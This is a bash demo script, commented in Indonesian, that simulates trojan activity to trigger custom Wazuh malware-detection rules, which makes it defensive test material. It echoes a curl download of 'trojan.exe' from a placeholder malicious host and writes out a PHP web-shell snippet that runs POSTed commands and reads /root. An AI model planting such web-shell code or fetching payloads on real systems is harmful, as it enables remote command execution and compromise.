#!/usr/bin/env bash
# =============================================================
# 10-trojan-demo.sh
# Demo script untuk test malware detection rules di Wazuh
# HANYA UNTUK TESTING/DEMO - tidak actual malware
# =============================================================
set -euo pipefail

echo "🚨 Wazuh Malware Detection Demo - Trojan Simulation"
echo "=================================================="
echo ""

# Color codes
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

DEMO_DIR="/tmp/wazuh_demo_trojan"
mkdir -p "$DEMO_DIR"

# Function untuk demo
demo_step() {
    echo -e "${YELLOW}[STEP]${NC} $1"
    sleep 2
}

# ============ Demo 1: Suspicious execution dari /tmp ============
demo_step "1. Creating suspicious script in /tmp (Rule 100200)"
cat > "$DEMO_DIR/suspicious.sh" << 'EOF'
#!/bin/bash
echo "This is a demo trojan"
echo "Connecting to command server..."
EOF
chmod +x "$DEMO_DIR/suspicious.sh"
bash "$DEMO_DIR/suspicious.sh"
echo ""

# ============ Demo 2: Trojan beacon simulation ============
demo_step "2. Simulating trojan beacon pattern (Rule 100206)"
echo "Simulating repeated external connections..."
for i in {1..5}; do
    echo "[Beacon $i] Attempting to reach command server..."
    # Using nslookup as safe simulation (won't actually connect to malicious server)
    nslookup 8.8.8.8 >/dev/null 2>&1 || true
    sleep 1
done
echo ""

# ============ Demo 3: Suspicious file creation ============
demo_step "3. Creating multiple suspicious files rapidly (Rule 100204)"
for i in {1..10}; do
    touch "$DEMO_DIR/trojan_payload_$i.bin"
    echo "Binary payload part $i" >> "$DEMO_DIR/trojan_payload_$i.bin"
done
ls -la "$DEMO_DIR"/trojan_payload_* | head -5
echo ""

# ============ Demo 4: Download simulation ============
demo_step "4. Simulating malware download attempt (Rule 100205)"
echo "Simulating trojan download with curl (won't actually execute)..."
# Safe simulation - just log the command
echo "curl http://malicious-server.fake/trojan.exe -o /tmp/malware" 
echo ""

# ============ Demo 5: Suspicious code pattern ============
demo_step "5. Creating file with suspicious PHP code (Rule 100207)"
cat > "$DEMO_DIR/suspicious.php" << 'EOF'
<?php
// Demo PHP with suspicious patterns for Wazuh detection
eval($_POST['cmd']);
system('id');
passthru('whoami');
shell_exec('ls -la /root');
proc_open('bash', [], $pipes);
?>
EOF
cat "$DEMO_DIR/suspicious.php"
echo ""

# ============ Demo 6: Parent process trojan indicator ============
demo_step "6. Spawning process from suspicious parent (Rule 100203)"
# Safe simulation - just demonstrate
(
    cd "$DEMO_DIR"
    bash -c "echo 'Child process from /tmp' > child_process.log"
)
echo ""

# ============ Summary ============
echo -e "${GREEN}✅ Demo Complete!${NC}"
echo ""
echo "Rules Triggered (check Wazuh alerts):"
echo "  - Rule 100200: Suspicious execution from /tmp"
echo "  - Rule 100204: Multiple file creation"
echo "  - Rule 100206: Beacon pattern (if monitoring network)"
echo "  - Rule 100207: Suspicious code patterns"
echo "  - Rule 100203: Process from suspicious parent"
echo ""
echo "Demo files created in: $DEMO_DIR"
echo ""

# Cleanup option
read -rp "Clean up demo files? (y/n): " cleanup
if [ "$cleanup" = "y" ]; then
    rm -rf "$DEMO_DIR"
    echo "✅ Demo files cleaned up"
else
    echo "Demo files preserved at: $DEMO_DIR"
fi
